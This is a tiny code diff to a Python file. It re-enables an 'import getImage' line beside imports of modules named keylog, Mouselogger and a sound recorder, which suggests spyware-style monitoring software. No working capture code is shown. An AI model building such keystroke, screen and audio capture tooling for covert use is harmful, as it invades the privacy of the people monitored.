@@ -1,6 +1,6 @@
 import keylog
 import time
-#import getImage
+import getImage
 import Mouselogger
 from Recorder_Son import Recorder
 
